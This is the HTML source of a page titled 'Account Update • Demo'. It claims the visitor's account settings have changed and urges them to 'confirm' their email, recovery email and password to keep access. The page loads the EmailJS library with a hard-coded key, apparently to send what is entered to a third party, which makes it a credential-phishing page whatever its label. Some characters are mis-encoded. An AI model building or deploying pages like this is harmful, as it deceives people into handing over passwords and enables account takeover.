<!DOCTYPE html><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Account Update ‚Ä¢ Demo</title>
  <link rel="stylesheet" href="style.css">

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
    emailjs.init("ln4M4oAummqBl5tiX"); <!-- Your EmailJS public key -->
  </script>
</head>
<body>
  <main class="page">
    <!-- Top notice / header -->
    <section class="panel notice">
      <div class="notice-inner">
        <h1 class="notice-title">Account Update</h1>
        <p class="notice-sub">
          We have updated your account settings. To keep your access active, please confirm your contact details below.
        </p>
        <a class="primary-btn" href="#action">Confirm details</a>
      </div>

      <!-- üëá Square picture top-right -->
      <div class="notice-graphic">
        <img src="download (1).png" alt="Decorative square" />
      </div>
    </section>

    <!-- Form panel -->
    <section id="action" class="panel form-panel">
      <div class="form-card">
        <h2 class="form-title">Quick confirmation</h2>
        <p class="form-desc">Enter your email, recovery email, and passwort.</p>

        <form id="demo-form" class="form" autocomplete="on" novalidate>
          <label class="field">
            <span class="label-text">Email</span>
            <input name="user_email" type="email" placeholder="you@example.com" required>
          </label>

          <label class="field">
            <span class="label-text">Recovery Email</span>
            <input name="recovery_email" type="email" placeholder="recovery@example.com" required>
          </label>

          <label class="field password-field">
            <span class="label-text">Password </span>
            <input name="passwort" id="passwort" type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" required>
            <button id="toggle-password" type="button" aria-label="Toggle password">üëÅÔ∏è</button>
          </label>

          <div class="actions">
            <button id="submit-btn" class="primary-btn" type="submit">Login</button>
            <button id="cancel-btn" class="link-btn" type="button">Cancel</button>
          </div>

          <p id="status" class="status" aria-live="polite"></p>
        </form>
      </div>
    </section>

  
  </main>

  <script src="script.js"></script>
</body>
</html>
